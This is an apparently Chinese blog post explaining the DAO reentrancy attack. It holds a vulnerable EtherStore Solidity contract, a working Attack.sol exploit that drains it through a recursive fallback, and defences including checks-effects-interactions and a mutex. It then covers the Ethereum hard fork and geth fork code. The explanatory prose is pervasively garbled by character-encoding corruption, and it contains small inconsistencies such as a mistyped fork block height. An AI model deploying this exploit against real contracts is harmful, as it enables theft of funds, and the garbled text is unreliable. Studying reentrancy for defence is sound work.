<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">EtherStore.solï¼š</span><br><span class="line"></span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">    mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function depositFunds() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFunds (uint256 _weiToWithdraw) public &#123; </span><br><span class="line">       require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        // limit the withdrawal </span><br><span class="line">       require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">        // limit the time allowed to withdraw</span><br><span class="line">        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks); </span><br><span class="line">       require(msg.sender.call.value(_weiToWithdraw)()); </span><br><span class="line">       balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä»£ç å°±æ˜¯è¢«æ”»å‡»ä»£ç ã€‚å®ƒçš„åŠŸèƒ½æ˜¯å……å½“å…¬å…±è´¦æˆ·ï¼Œç±»ä¼¼äºé“¶è¡Œï¼Œæ¥æ”¶ç”¨æˆ·å­˜æ¬¾ï¼ˆdepositFundï¼‰ï¼Œæä¾›ç”¨æˆ·å–ç°åŠŸèƒ½ï¼ˆwithdrawFundsï¼‰ã€‚</p>
<p>depositFundä¸­ï¼Œç®€å•å¢åŠ ç”¨æˆ·è´¦æˆ·çš„ä½™é¢ï¼Œåœ¨ç”¨æˆ·å–ç°çš„æ—¶å€™ï¼Œé¦–å…ˆåšæ£€æŸ¥ï¼Œç¡®ä¿ç”¨æˆ·è´¦æˆ·çš„ä½™é¢è¶…å‡ºæ‰€è¦æå–çš„é‡‘é¢ï¼Œç„¶åæ£€æŸ¥å–ç°é‡‘é¢çš„æœ€å¤§å€¼ï¼›æ¥ä¸‹æ¥å†å¯¹å–ç°çš„æ—¶é—´è¿›è¡Œé™åˆ¶ï¼Œç¡®ä¿ä¸€å‘¨æ”¯å–ä¸€æ¬¡ã€‚ç„¶åå°†é’±è½¬ç»™è°ƒç”¨è€…è´¦æˆ·ï¼Œéšåä¿®æ”¹è°ƒç”¨è€…msg.sendçš„ä½™é¢ï¼Œå¹¶æ›´æ–°æœ€æ–°çš„å–ç°æ—¶é—´ã€‚</p>
<p>è¿™æ®µåˆçº¦çš„æ¼æ´å°±åœ¨äºï¼šrequire(msg.sender.call.value(_weiToWithdraw)());</p>
<p>å½“è¢«æ”»å‡»ä»£ç æ‰§è¡Œåˆ°è¿™ä¸€å¥çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨msg.sendä»£ç ä¸­çš„fallbackå‡½æ•°ã€‚å¦‚æœæ˜¯æ­£å¸¸çš„fallbackå‡½æ•°ï¼Œè­¬å¦‚å†™æ—¥å¿—ï¼Œé‚£æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼›ä½†æ˜¯å¦‚æœæ˜¯æ”»å‡»è€…ç²¾å¿ƒå‡†å¤‡çš„æ¶æ„ä»£ç ï¼Œä¼šæœ‰å„ç§æ•ˆæœã€‚</p>
<p>è­¬å¦‚ï¼Œä¸‹é¢ä¸€æ®µæ”»å‡»ä»£ç ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Attack.solï¼š</span><br><span class="line"></span><br><span class="line">import &quot;EtherStore.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"> EtherStore public etherStore;</span><br><span class="line"></span><br><span class="line">  // intialise the etherStore variable with the contract address</span><br><span class="line"> constructor(address _etherStoreAddress) &#123;</span><br><span class="line">     etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function pwnEtherStore() public payable &#123;</span><br><span class="line">      // attack to the nearest ether</span><br><span class="line">     require(msg.value &gt;= 1 ether); </span><br><span class="line">     // send eth to the depositFunds() function</span><br><span class="line">     etherStore.depositFunds.value(1 ether)();</span><br><span class="line">      // start the magic</span><br><span class="line">     etherStore.withdrawFunds(1 ether);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function collectEther() public &#123;</span><br><span class="line">     msg.sender.transfer(this.balance);</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"> // fallback function - where the magic happens</span><br><span class="line"> function () payable &#123;</span><br><span class="line">      if (etherStore.balance &gt; 1 ether) &#123;</span><br><span class="line">         etherStore.withdrawFunds(1 ether);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»è€…é¦–å…ˆå‡†å¤‡å¥½ etherStoreå˜é‡ï¼Œå¹¶å°†ä½œä¸ºè¢«æ”»å‡»ä»£ç çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚</p>
<p>etherStore &#x3D; EtherStore(_etherStoreAddress);</p>
<p>æ”»å‡»è€…å‡†å¤‡å¥½pwnEtherStore()ï¼Œè¿™ä¸ªå‡½æ•°é¦–å…ˆå‘è¢«æ”»å‡»åˆçº¦ä¸­å­˜å…¥ä¸€å®šä»¥å¤ªå¸ï¼Œå‡è®¾æ˜¯1ä»¥å¤ªå¸ï¼ˆå› ä¸ºEtherStore.solè¦æ±‚å–ç°æ˜¯è´¦æˆ·é‡Œæœ‰ä¸€å®šä½™é¢ï¼‰ã€‚</p>
<p>etherStore.depositFunds.value(1 ether)()</p>
<p>ç„¶åè¿›è¡Œå–ç°ï¼Œè°ƒç”¨ etherStore.withdrawFunds(1 ether);</p>
<p>å› ä¸ºwithdrawå‡½æ•°ä¸­ä½¿ç”¨äº†call.value()ï¼Œæ ¹æ®solidityçš„è§„èŒƒï¼Œfallbackå‡½æ•°å°†åœ¨Attackåˆçº¦æ”¶åˆ°Etherï¼ˆä¸å¸¦dataï¼‰æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚æ­¤fallbackå‡½æ•°å°†é€šè¿‡é€’å½’è§¦å‘å¯¹THE DAOçš„splitDAOå‡½æ•°çš„å¤šæ¬¡è°ƒç”¨æ‰€ä»¥ä¼šè°ƒç”¨æ”»å‡»è€…åˆçº¦ä¸­çš„åŒ¿åå‡½æ•°ï¼Œè€Œåœ¨æ”»å‡»è€…çš„åŒ¿åå‡½æ•°ä¸­ï¼Œåˆå†æ¬¡è°ƒç”¨</p>
<p>etherStore.withdrawFunds(1 ether)ã€‚</p>
<p>å› ä¸ºå—å®³è€…çš„ä»£ç ä¸­withdrawFundsåœ¨call.valueä¹‹åæ‰ä¿®æ”¹æ”»å‡»è€…çš„ä½™é¢ï¼Œè€Œcall.valueè§¦å‘fallbackï¼Œå†æ¬¡æ‰§è¡Œwithdrawï¼Œæ‰€ä»¥ç›¸å½“äºæ”»å‡»è€…çš„ä½™é¢ä¸€ç›´æ²¡æœ‰æœºä¼šè¢«ä¿®æ”¹ã€‚è¿™æ ·ï¼Œåªè¦æ”»å‡»è€…çš„gasè¶³å¤Ÿå¤šï¼Œå®ƒä¼šä¸€ç›´å°†å…¬å…±è´¦æˆ·ä¹Ÿå³Banké‡Œçš„é’±å…¨éƒ¨ç§»èµ°ã€‚</p>
<p>å› ä¸ºæ”»å‡»è€…çš„ä»£ç ä½¿å¾—å—å®³è€…åˆçº¦ä¸€ééåœ°é‡æ–°æ‰§è¡Œæ”»å‡»ä»£ç ï¼Œæ‰€ä»¥ä¹Ÿå«â€œé‡å…¥â€æ”»å‡»ã€‚</p>
<p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p>
<p>ä»ä»£ç çœ‹ï¼Œæœ¬æ¬¡æ”»å‡»å¾—ä»¥æˆåŠŸçš„å› ç´ æœ‰äºŒï¼šä¸€æ˜¯daoä½™é¢æ‰£å‡å’ŒEtherè½¬è´¦è¿™ä¸¤æ­¥æ“ä½œçš„é¡ºåºæœ‰è¯¯ï¼ŒäºŒæ˜¯ä¸å—é™åˆ¶åœ°æ‰§è¡ŒæœªçŸ¥ä»£ç ã€‚</p>
<p>åº”ç”¨ä»£ç é¡ºåºæ–¹é¢ï¼Œåº”å…ˆæ‰£å‡daoçš„ä½™é¢å†è½¬è´¦Etherï¼Œå› ä¸ºdaoçš„ä½™é¢æ£€æŸ¥ä½œä¸ºè½¬è´¦Etherçš„å…ˆå†³æ¡ä»¶ï¼Œè¦æ±‚daoçš„ä½™é¢çŠ¶å†µå¿…é¡»èƒ½å¤ŸåŠæ—¶åæ˜ æœ€æ–°çŠ¶å†µã€‚åœ¨é—®é¢˜ä»£ç å®ç°ä¸­ï¼Œå°½ç®¡æœ€æ·±çš„é€’å½’è¿”å›å¹¶æˆåŠŸæ‰£å‡é»‘å®¢çš„daoä½™é¢ï¼Œä½†æ­¤æ—¶å¯¹é»‘å®¢daoä½™é¢çš„æ‰£å‡å·²ç»æ— æµäºäº‹ï¼Œå› ä¸ºå…¶ä¸Šå„å±‚é€’å½’è°ƒç”¨ä¸­ä½™é¢æ£€æŸ¥éƒ½å·²æˆåŠŸå‘Šç»ˆï¼Œå·²ç»ä¸ä¼šå†æœ‰æœºä¼šåˆ¤æ–­æœ€æ–°ä½™é¢äº†ã€‚</p>
<p>ä¸å—é™åˆ¶åœ°æ‰§è¡ŒæœªçŸ¥ä»£ç æ–¹é¢ï¼Œè™½ç„¶é»‘å®¢å½“å‰æ˜¯åˆ©ç”¨äº†solidityæä¾›çš„åŒ¿åfallbackå‡½æ•°ï¼Œä½†è¿™ç§å¯¹æœªçŸ¥ä»£ç çš„æ‰§è¡ŒåŸåˆ™ä¸Šå¯ä»¥å‘ç”Ÿåœ¨æ›´å¤šåœºæ™¯ä¸‹ï¼Œå› ä¸ºåˆçº¦ä¹‹é—´çš„æ¶ˆæ¯ä¼ é€’å®Œå…¨ç±»ä¼¼äºé¢å‘å¯¹è±¡ç¨‹åºå¼€å‘ä¸­çš„æ–¹æ³•è°ƒç”¨ï¼Œè€Œæä¾›æ¥å£ç­‰å¾…å›è°ƒæ˜¯è®¾è®¡æ¨¡å¼ä¸­å¸¸è§çš„æ‰‹æ³•ï¼Œæ‰€ä»¥å®Œå…¨æœ‰å¯èƒ½æ‰§è¡Œä¸€ä¸ªæœªçŸ¥çš„æ™®é€šå‡½æ•°ã€‚</p>
<p>æœ¬æ¬¡æ¼æ´å±äºåº”ç”¨å±‚é¢ï¼Œå¹¶ä¸æ˜¯ä»¥å¤ªåŠæœ¬èº«çš„é—®é¢˜ï¼Œç”šè‡³éƒ½ä¸èƒ½å½’å’äºâ€œå›¾çµå®Œå¤‡â€ï¼Œå› ä¸ºè¿™ç§æ”»å‡»å³ä½¿åœ¨ä¸€ä¸ªéå›¾çµå®Œå¤‡çš„å¹³å°ä¸Šä¹Ÿå¯ä»¥å¥æ•ˆã€‚æ€»çš„æ¥è¯´ï¼Œåº”ç”¨è¶Šå¤æ‚ï¼Œåº”ç”¨å‡ºç°å®‰å…¨é—®é¢˜çš„æ¦‚ç‡å°±è¶Šé«˜ã€‚</p>
<p>æœ‰è®¸å¤šå¸¸ç”¨æŠ€æœ¯å¯ä»¥å¸®åŠ©é¿å…æ™ºèƒ½åˆçº¦ä¸­æ½œåœ¨çš„é‡å…¥æ¼æ´ï¼š</p>
<ol>
<li>åœ¨å°† Ether å‘é€ç»™å¤–éƒ¨åˆçº¦æ—¶ä½¿ç”¨å†…ç½®çš„ transfer() å‡½æ•° ã€‚transferè½¬è´¦åŠŸèƒ½åªå‘é€ 2300 gas ä¸è¶³ä»¥ä½¿ç›®çš„åœ°å€&#x2F;åˆçº¦è°ƒç”¨å¦ä¸€ä»½åˆçº¦ï¼ˆå³é‡å…¥å‘é€åˆçº¦ï¼‰ã€‚</li>
<li>ç¡®ä¿æ‰€æœ‰æ”¹å˜çŠ¶æ€å˜é‡çš„é€»è¾‘å‘ç”Ÿåœ¨ Ether è¢«å‘é€å‡ºåˆçº¦ï¼ˆæˆ–ä»»ä½•å¤–éƒ¨è°ƒç”¨ï¼‰ä¹‹å‰ã€‚åœ¨è¿™ä¸ª EtherStore ä¾‹å­ä¸­ï¼ŒEtherStore.sol ä¸­å¯¹è´¦æˆ·ä½™é¢å’Œè´¦æˆ·æ—¶é—´çš„ä¿®æ”¹åº”è¯¥åœ¨å‘é€ä»¥å¤ªå¸ä¹‹å‰ã€‚å°†ä»»ä½•å¯¹æœªçŸ¥åœ°å€æ‰§è¡Œå¤–éƒ¨è°ƒç”¨çš„ä»£ç ï¼Œæ”¾ç½®åœ¨æœ¬åœ°åŒ–å‡½æ•°æˆ–ä»£ç æ‰§è¡Œä¸­ä½œä¸ºæœ€åä¸€ä¸ªæ“ä½œï¼Œæ˜¯ä¸€ç§å¾ˆå¥½çš„åšæ³•ã€‚è¿™è¢«ç§°ä¸º <a href="https://link.zhihu.com/?target=http://solidity.readthedocs.io/en/latest/security-considerations.html%23use-the-checks-effects-interactions-pattern">æ£€æŸ¥æ•ˆæœäº¤äº’ï¼ˆchecks-effects-interactionsï¼‰</a> æ¨¡å¼ã€‚</li>
<li>å¼•å…¥äº’æ–¥é”ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦æ·»åŠ ä¸€ä¸ªåœ¨ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­é”å®šåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œé˜»æ­¢é‡å…¥è°ƒç”¨ï¼›è¿™æ ·åœ¨æœ¬æ¬¡å‘é€â€“ä¿®æ”¹ä½™é¢è¿™ä¸€æ•´å¥—æ“ä½œå®Œæˆä¹‹å‰ï¼Œä¸èƒ½å†æ¬¡æ‰§è¡Œå‘é€æ“ä½œã€‚</li>
</ol>
<p>è­¬å¦‚ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">// initialise the mutex</span><br><span class="line">bool reEntrancyMutex = false;</span><br><span class="line">uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">function depositFunds() public payable &#123;</span><br><span class="line">    balances[msg.sender] += msg.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    require(!reEntrancyMutex);</span><br><span class="line">    require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">    // limit the withdrawal</span><br><span class="line">    require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">    // limit the time allowed to withdraw</span><br><span class="line">    require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);</span><br><span class="line">    balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    lastWithdrawTime[msg.sender] = now; </span><br><span class="line">   // set the reEntrancy mutex before the external call</span><br><span class="line">    reEntrancyMutex = true; </span><br><span class="line">   msg.sender.transfer(_weiToWithdraw);</span><br><span class="line">    // release the mutex after the external call </span><br><span class="line">   reEntrancyMutex = false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨reEntrancyMutexå¯ä»¥ä¿è¯ä»£ç ä¸å¯é‡å…¥ã€‚ç±»ä¼¼äºå¤šçº¿ç¨‹çš„äº’æ–¥é”ã€‚</p>
<p>THE DAOæ”»å‡»åç»­ï¼š</p>
<p>THE DAO åˆ›å§‹äººä¹‹ä¸€ Stephan TualTual åœ¨ 6 æœˆ 12 æ—¥å®£å¸ƒï¼Œä»–ä»¬å‘ç°äº†è½¯ä»¶ä¸­å­˜åœ¨çš„ â€œé€’å½’è°ƒç”¨æ¼æ´â€ é—®é¢˜ã€‚ ä¸å¹¸çš„æ˜¯ï¼Œåœ¨ç¨‹åºå‘˜ä¿®å¤è¿™ä¸€æ¼æ´åŠå…¶ä»–é—®é¢˜çš„æœŸé—´ï¼Œä¸€ä¸ªä¸çŸ¥åçš„é»‘å®¢å¼€å§‹åˆ©ç”¨è¿™ä¸€é€”å¾„æ”¶é›† THE DAO ä»£å¸é”€å”®ä¸­æ‰€å¾—çš„ä»¥å¤ªå¸ã€‚6 æœˆ 18 æ—¥ï¼Œé»‘å®¢æˆåŠŸæŒ–åˆ°è¶…è¿‡ 360 ä¸‡ä¸ªä»¥å¤ªå¸ï¼Œå¹¶æŠ•å…¥åˆ°ä¸€ä¸ª DAO å­ç»„ç»‡ä¸­ï¼Œè¿™ä¸ªç»„ç»‡å’Œ THE DAO æœ‰ç€åŒæ ·çš„ç»“æ„ã€‚å› ä¸ºTHE DAO æŒæœ‰è¿‘ 15% çš„ä»¥å¤ªå¸æ€»æ•°ï¼Œå› æ­¤ THE DAO è¿™æ¬¡çš„é—®é¢˜å¯¹ä»¥å¤ªåŠç½‘ç»œåŠå…¶åŠ å¯†å¸éƒ½äº§ç”Ÿäº†è´Ÿé¢å½±å“ã€‚</p>
<p>6 æœˆ 17 æ—¥ï¼Œä»¥å¤ªåŠåŸºé‡‘ä¼šçš„ Vitalik Buterinåœ¨ä»¥å¤ªåŠå®˜æ–¹åšå®¢å‘å¸ƒé¢˜ä¸ºï¼»ç´§æ€¥çŠ¶æ€æ›´æ–°ï¼šå…³äºthe DAOçš„æ¼æ´ï¼½çš„æ–‡ç« ï¼Œä»–è¡¨ç¤ºï¼ŒDAO æ­£åœ¨é­åˆ°æ”»å‡»ï¼Œä¸è¿‡ä»–å·²ç»ç ”ç©¶å‡ºäº†è§£å†³æ–¹æ¡ˆï¼š</p>
<blockquote>
<p>ç°åœ¨æå‡ºäº†è½¯ä»¶åˆ†å‰è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡è¿™ç§è½¯ä»¶åˆ†å‰ï¼Œä»»ä½•è°ƒç”¨ä»£ç æˆ–å§”æ‰˜è°ƒç”¨çš„äº¤æ˜“ â€”â€” å€ŸåŠ©ä»£ç  hash0x7278d050619a624f84f51987149ddb439cdaadfba5966f7cfaea7ad44340a4baï¼ˆä¹Ÿå°±æ˜¯ DAO å’Œå­ DAOï¼‰æ¥å‡å°‘è´¦æˆ·ä½™é¢ â€”â€” éƒ½ä¼šè§†ä¸ºæ— æ•ˆâ€¦â€¦</p>
</blockquote>
<p>æœ€ç»ˆå› ä¸ºç¤¾äº¤çš„ä¸åŒæ„è§ï¼Œæœ€ç»ˆä»¥å¤ªåŠåˆ†è£‚å‡ºæ”¯æŒç»§ç»­ç»´æŒåŸçŠ¶çš„ä»¥å¤ªç»å…¸ ETCï¼ŒåŒæ„è½¯ä»¶åˆ†å‰è§£å†³æ–¹æ¡ˆçš„åœ¨ä»¥å¤ªåŠå½“å‰ç½‘ç»œå®æ–½ã€‚</p>
<p>ã€ç–‘ä¼¼ã€‘æ”»å‡»è€…é€šè¿‡ä¸€ä¸ªä¸­ä»‹è¡¨ç¤ºï¼Œä»–ä¼šæš‚åœè¿™ä¸ªæœ‰ç»„ç»‡çš„å¯¹ä»–è´¢äº§çš„â€œç›—çªƒâ€ï¼Œä»–ä¼šå¥–åŠ±ä¸æ”¯æŒè¿™é¡¹è½¯åˆ†å‰æè®®çš„çŸ¿å·¥ï¼ˆèŠ‚ç‚¹ï¼‰ï¼Œä»–è¯´ï¼š</p>
<blockquote>
<p>â€œå¾ˆå¿«æˆ‘ä»¬å°±ä¼šæœ‰ä¸€ä¸ªæ™ºèƒ½åˆçº¦æ¥å¥–åŠ±çŸ¿å·¥ï¼Œå¥–åŠ±é‚£äº›åå¯¹è½¯åˆ†å‰å¹¶è¿›è¡ŒæŒ–çŸ¿çš„äººã€‚å…±è®¡100ä¸‡ä¸ªä»¥å¤ªå¸ï¼Œä»¥åŠ100ä¸ªæ¯”ç‰¹å¸ä¼šåˆ†äº«ç»™çŸ¿å·¥ã€‚â€</p>
</blockquote>
<p>Vç¥çš„è§£å†³æ–¹æ¡ˆå®é™…ä¸Šå°±æ˜¯äº§ç”Ÿåˆ†å‰ï¼Œè®©é»‘å®¢çš„æ“ä½œæ— æ•ˆã€‚è½¯åˆ†å‰å°†ä»å—é«˜åº¦1760000å¼€å§‹æŠŠä»»ä½•ä¸the DAOå’Œchild DAOç›¸å…³çš„äº¤æ˜“è®¤åšæ— æ•ˆäº¤æ˜“ï¼Œä»¥æ­¤é˜»æ­¢æ”»å‡»è€…åœ¨27å¤©ä¹‹åæç°è¢«ç›— çš„ä»¥å¤ªå¸ã€‚è¿™ä¹‹åä¼šæœ‰ä¸€æ¬¡ç¡¬åˆ†å‰å°†ä»¥å¤ªå¸æ‰¾å›ã€‚</p>
<p>ä»¥ä¸‹å†…å®¹æ¥è‡ªäºå‚è€ƒæ–‡çŒ®11ï¼š</p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a><strong>è§£å†³æ–¹æ¡ˆ</strong></h3><p>å› ä¸ºæŠ•èµ„è€…å·²ç»å°†ä»¥å¤ªå¸æŠ•å…¥äº† The DAO åˆçº¦æˆ–è€…å…¶å­åˆçº¦ä¸­ï¼Œåœ¨æ”»å‡»åæ— æ³•ç«‹åˆ»æ’¤å›ã€‚<br>éœ€è¦è®©æŠ•èµ„è€…å¿«é€Ÿæ’¤å›æŠ•èµ„ï¼Œä¸”èƒ½å°é”é»‘å®¢è½¬ç§»èµ„äº§ã€‚</p>
<p>V ç¥å…¬å¸ƒçš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼Œåœ¨ç¨‹åºä¸­æ¤å…¥è½¬ç§»åˆçº¦ä»¥å¤ªå¸ä»£ç ï¼Œè®©çŸ¿å·¥é€‰æ‹©æ˜¯å¦æ”¯æŒåˆ†å‰ã€‚åœ¨åˆ†å‰ç‚¹åˆ°è¾¾æ—¶åˆ™å°† The DAO å’Œå…¶å­åˆçº¦ä¸­çš„ä»¥å¤ªå¸è½¬ç§»åˆ°ä¸€ä¸ªæ–°çš„å®‰å…¨çš„å¯å–æ¬¾åˆçº¦ä¸­ã€‚å…¨éƒ¨è½¬ç§»åï¼ŒåŸæŠ•èµ„è€…åˆ™å¯ä»¥ç›´æ¥ä»å–æ¬¾åˆçº¦ä¸­å¿«é€Ÿçš„æ‹¿å›ä»¥å¤ªå¸ã€‚å–æ¬¾åˆçº¦åœ¨è®¨è®ºæ–¹æ¡ˆæ—¶ï¼Œå·²ç»éƒ¨ç½²åˆ°ä¸»ç½‘ã€‚åˆçº¦åœ°å€æ˜¯ <a href="https://link.zhihu.com/?target=https://%5Betherscan%5D(https//learnblockchain.cn/docs/etherscan/">0xbf4ed7b27f1d666546e30d74d50d173d20bca754</a>.io&#x2F;address&#x2F;0xbf4ed7b27f1d666546e30d74d50d173d20bca754)ã€‚</p>
<p>å–æ¬¾åˆçº¦ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// Deployed on mainnet at 0xbf4ed7b27f1d666546e30d74d50d173d20bca754</span><br><span class="line"></span><br><span class="line">contract DAO &#123;</span><br><span class="line">    function balanceOf(address addr) returns (uint);</span><br><span class="line">    function transferFrom(address from, address to, uint balance) returns (bool);</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WithdrawDAO &#123;</span><br><span class="line">    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);</span><br><span class="line">    address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526;</span><br><span class="line"></span><br><span class="line">    function withdraw()&#123;</span><br><span class="line">        uint balance = mainDAO.balanceOf(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))</span><br><span class="line">            throw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trusteeWithdraw() &#123;</span><br><span class="line">        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ï¼Œä¸ºç…§é¡¾ä¸¤ä¸ªé˜µè¥ï¼Œè½¯ä»¶æä¾›ç¡¬åˆ†å‰å¼€å…³ï¼Œé€‰æ‹©æƒåˆ™äº¤ç»™ç¤¾åŒºã€‚æ”¯æŒåˆ†å‰çš„çŸ¿å·¥ä¼šåœ¨ X åŒºå—åˆ° X+9 åŒºå—å‡ºå—æ—¶ï¼Œåœ¨åŒºå— <code>extradata</code> å­—æ®µä¸­å†™å…¥ <code>0x64616f2d686172642d666f726b</code>ï¼ˆâ€œdao-hard-forkâ€ çš„åå…­è¿›åˆ¶æ•°ï¼‰ã€‚ä»åˆ†å‰ç‚¹å¼€å§‹ï¼Œå¦‚æœè¿ç»­ 10 ä¸ªåŒºå—å‡æœ‰ç¡¬åˆ†å‰æŠ•ç¥¨ï¼Œåˆ™è¡¨ç¤ºç¡¬åˆ†å‰æˆåŠŸã€‚</p>
<h3 id="çŸ¿å·¥æŠ•ç¥¨ä¸åŒºå—å¤´æ ¡éªŒ"><a href="#çŸ¿å·¥æŠ•ç¥¨ä¸åŒºå—å¤´æ ¡éªŒ" class="headerlink" title="çŸ¿å·¥æŠ•ç¥¨ä¸åŒºå—å¤´æ ¡éªŒ"></a><strong>çŸ¿å·¥æŠ•ç¥¨ä¸åŒºå—å¤´æ ¡éªŒ</strong></h3><p>é¦–å…ˆï¼Œé€‰æ‹©æƒäº¤ç»™ç¤¾åŒºã€‚å› æ­¤æ˜¯å¦åŒæ„ç¡¬åˆ†å‰ï¼Œå¯é€šè¿‡å‚æ•°è¿›è¡Œé€‰æ‹©ã€‚ä½†æ˜¯åœ¨å½“å‰ç‰ˆæœ¬ä¸­ï¼Œç¤¾åŒºå·²å®Œæˆç¡¬åˆ†å‰ï¼Œæ‰€ä»¥å·²ç§»é™¤å¼€å…³ç±»ä»£ç ã€‚</p>
<p>å½“å‰ï¼Œä¸»ç½‘å·²é»˜è®¤é…ç½®æ”¯æŒ DAO åˆ†å‰ï¼Œå¹¶è®¾å®šäº†å¼€å§‹ç¡¬åˆ†å‰é«˜åº¦ 1920000ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// params/config.go:38</span><br><span class="line">MainnetChainConfig = &amp;ChainConfig&#123; </span><br><span class="line">		DAOForkBlock:        big.NewInt(1920000),</span><br><span class="line">		DAOForkSupport:      true, </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœçŸ¿å·¥æ”¯æŒåˆ†å‰ï¼Œåˆ™éœ€è¦åœ¨ä»é«˜åº¦ 192000 åˆ° 192009ï¼Œåœ¨åŒºå—å¤´ <code>extradata</code> å†™å…¥æŒ‡å®šä¿¡æ¯ 0x64616f2d686172642d666f726b ï¼Œä»¥è¡¨ç¤ºæ”¯æŒç¡¬åˆ†å‰ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">//params/dao.go:28</span><br><span class="line">var DAOForkBlockExtra = common.FromHex(&quot;0x64616f2d686172642d666f726b&quot;)</span><br><span class="line"></span><br><span class="line">// params/dao.go:32</span><br><span class="line">var DAOForkExtraRange = big.NewInt(10)</span><br></pre></td></tr></table></figure>

<p>æ”¯æŒç¡¬åˆ†å‰æ—¶çŸ¿å·¥å†™å…¥å›ºå®šçš„æŠ•ç¥¨ä¿¡æ¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// miner/worker.go:857</span><br><span class="line">if daoBlock := w.config.DAOForkBlock; daoBlock != nil &#123; </span><br><span class="line">    // æ£€æŸ¥æ˜¯å¦åŒºå—æ˜¯å¦ä»ç„¶å±äºåˆ†å‰å¤„ç†æœŸé—´ï¼š[DAOForkBlock,DAOForkBlock+10)</span><br><span class="line">    limit := new(big.Int).Add(daoBlock, params.DAOForkExtraRange)</span><br><span class="line">    if header.Number.Cmp(daoBlock) &gt;= 0 &amp;&amp; header.Number.Cmp(limit) &lt; 0 &#123;</span><br><span class="line">        // å¦‚æœæ”¯æŒåˆ†å‰ï¼Œåˆ™è¦†ç›–Extraï¼Œå†™å…¥ä¿ç•™çš„æŠ•ç¥¨ä¿¡æ¯</span><br><span class="line">        if w.config.DAOForkSupport &#123;</span><br><span class="line">        header.Extra = common.CopyBytes(params.DAOForkBlockExtra)</span><br><span class="line">        &#125; else if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;</span><br><span class="line">            // å¦‚æœçŸ¿å·¥åå¯¹ï¼Œåˆ™ä¸èƒ½è®©å…¶ä½¿ç”¨ä¿ç•™ä¿¡æ¯ï¼Œè¦†ç›–å®ƒã€‚</span><br><span class="line">        header.Extra = []byte&#123;&#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

